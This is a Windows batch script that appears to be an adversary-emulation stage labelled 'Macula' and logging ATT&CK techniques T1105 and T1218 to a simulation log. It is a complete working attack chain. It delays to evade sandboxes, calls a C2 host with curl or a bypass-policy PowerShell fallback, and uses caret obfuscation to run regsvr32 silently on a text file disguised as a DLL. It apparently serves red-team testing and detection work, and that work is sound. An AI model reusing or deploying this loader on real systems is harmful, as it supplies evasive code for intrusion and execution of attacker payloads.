@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET jhqwr=%APPDATA%\8174\2bae31e3
SET vbnmy=Macula-Stage0-8174
SET cxzlp=https://10.0.0.49
SET dkfgv=https://10.0.0.49/stage/2/icon.png?8174-7
SET wertu=BALAM-S2BO
SET poiuy=7
SET lkjhg=onenote.txt
SET mnbvc=8174

REM Log file path using PHR_ variable
SET qazws=%APPDATA%\!poiuy!\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!poiuy!\" (
    mkdir "%APPDATA%\!poiuy!\" >nul 2>nul
    echo [!DATE! !TIME!][DEBUG][!wertu!]: create_log_dir=%APPDATA%\!poiuy!>> "!qazws!" 2>nul
)

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_start=initial_35s>> "!qazws!" 2>nul
timeout /t 35 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_end=initial_35s>> "!qazws!" 2>nul

REM 1. CORRECTED C2 HEARTBEAT - PROPER CURL SYNTAX WITH NETWORK VALIDATION
echo [!DATE! !TIME!][DEBUG][!wertu!]: heartbeat_start=!dkfgv!>> "!qazws!" 2>nul

REM Check basic network connectivity first
ping -n 2 8.8.8.8 >nul 2>&1
IF NOT !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!wertu!]: network_test_failed>> "!qazws!" 2>nul
    SET hbres=0
    SET hberr=no_network
    GOTO :log_heartbeat_ttp
)

REM Obfuscate curl with minimal caret escapes
SET c1=c^
SET c2=u^
SET c3=r^
SET c4=l

REM Check if curl exists
where !c1!!c2!!c3!!c4! >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!wertu!]: curl_found_attempting_heartbeat>> "!qazws!" 2>nul
    
    REM Execute curl with correct syntax - no excessive obfuscation
    !c1!!c2!!c3!!c4! -k -s -o nul --connect-timeout 10 "!dkfgv!" >nul 2>&1
    SET curl_rc=!ERRORLEVEL!
    
    IF !curl_rc! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!wertu!]: heartbeat_success_curl>> "!qazws!" 2>nul
        SET hbres=1
        SET hberr=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!wertu!]: heartbeat_failed_curl_error_!curl_rc!>> "!qazws!" 2>nul
        SET hbres=0
        SET hberr=curl_!curl_rc!
    )
) ELSE (
    REM PowerShell fallback - clean execution without complex obfuscation
    echo [!DATE! !TIME!][DEBUG][!wertu!]: curl_not_found_trying_powershell>> "!qazws!" 2>nul
    
    REM Simple PowerShell command with proper error handling
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try {$r=Invoke-WebRequest -Uri '!dkfgv!' -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop; if ($r.StatusCode -eq 200) { exit 0 } else { exit 1 }} catch { exit 2 }" >nul 2>&1
    SET ps_rc=!ERRORLEVEL!
    
    IF !ps_rc! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!wertu!]: heartbeat_success_powershell>> "!qazws!" 2>nul
        SET hbres=1
        SET hberr=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!wertu!]: heartbeat_failed_powershell_error_!ps_rc!>> "!qazws!" 2>nul
        SET hbres=0
        SET hberr=ps_!ps_rc!
    )
)

:log_heartbeat_ttp
REM TTP logging for T1105 - Ingress Tool Transfer
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!wertu!]: !poiuy!-!mnbvc!-T1105|Ingress Tool Transfer=!hbres!:!hberr!
echo !ttp_line!>> "!qazws!" 2>nul || echo [!DATE! !TIME!][DEBUG][!wertu!]: ttp_log_failed >>nul 2>nul

REM Random delay between operations
SET /A rdelay=!RANDOM! %% 15 + 10
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_start=random_!rdelay!s>> "!qazws!" 2>nul
ping -n !rdelay! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_end=random_!rdelay!s>> "!qazws!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!wertu!]: chdir_start=!jhqwr!>> "!qazws!" 2>nul
cd /d "!jhqwr!" >nul 2>nul
SET cd_rc=!ERRORLEVEL!

IF !cd_rc! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!wertu!]: chdir_success=!jhqwr!>> "!qazws!" 2>nul
    SET cdres=1
    SET cderr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!wertu!]: chdir_failed=error_!cd_rc!>> "!qazws!" 2>nul
    SET cdres=0
    SET cderr=path_not_found
)

REM Short delay before execution
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_start=pre_exec_8s>> "!qazws!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_end=pre_exec_8s>> "!qazws!" 2>nul

REM 3. Execute DLL with obfuscated Regsvr32 path
echo [!DATE! !TIME!][DEBUG][!wertu!]: dll_load_start=!lkjhg!>> "!qazws!" 2>nul

REM Obfuscate Regsvr32 path with caret escapes
SET w1=%^
SET w2=S^
SET w3=y^
SET w4=s^
SET w5=t^
SET w6=e^
SET w7=m^
SET w8=R^
SET w9=o^
SET w10=o^
SET w11=t^
SET w12=%^
SET w13=\^
SET w14=S^
SET w15=y^
SET w16=s^
SET w17=t^
SET w18=e^
SET w19=m^
SET w20=3^
SET w21=2^
SET w22=\^
SET r1=R^
SET r2=e^
SET r3=g^
SET r4=s^
SET r5=v^
SET r6=r^
SET r7=3^
SET r8=2^
SET e1=.^
SET e2=e^
SET e3=x^
SET e4=e
SET s1=/^
SET s2=s

REM Execute: %SystemRoot%\System32\Regsvr32.exe /s "DLL_PATH"
!w1!!w2!!w3!!w4!!w5!!w6!!w7!!w8!!w9!!w10!!w11!!w12!!w13!!w14!!w15!!w16!!w17!!w18!!w19!!w20!!w21!!w22!!r1!!r2!!r3!!r4!!r5!!r6!!r7!!r8!!e1!!e2!!e3!!e4! !s1!!s2! "!lkjhg!"
SET dll_rc=!ERRORLEVEL!

IF !dll_rc! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!wertu!]: dll_load_success=!lkjhg!>> "!qazws!" 2>nul
    SET dlres=1
    SET dlerr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!wertu!]: dll_load_failed=error_!dll_rc!>> "!qazws!" 2>nul
    SET dlres=0
    SET dlerr=regsvr32_failed
)

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_start=final_12s>> "!qazws!" 2>nul
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!wertu!]: delay_end=final_12s>> "!qazws!" 2>nul

REM TTP Logging for T1218 - Signed Binary Proxy Execution
SET ttp_result=!dlres!
SET ttp_error=!dlerr!
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!wertu!]: !poiuy!-!mnbvc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!
echo !ttp_line!>> "!qazws!" 2>nul || echo [!DATE! !TIME!][DEBUG][!wertu!]: ttp_log_failed >>nul 2>nul

echo [!DATE! !TIME!][DEBUG][!wertu!]: script_complete>> "!qazws!" 2>nul
ENDLOCAL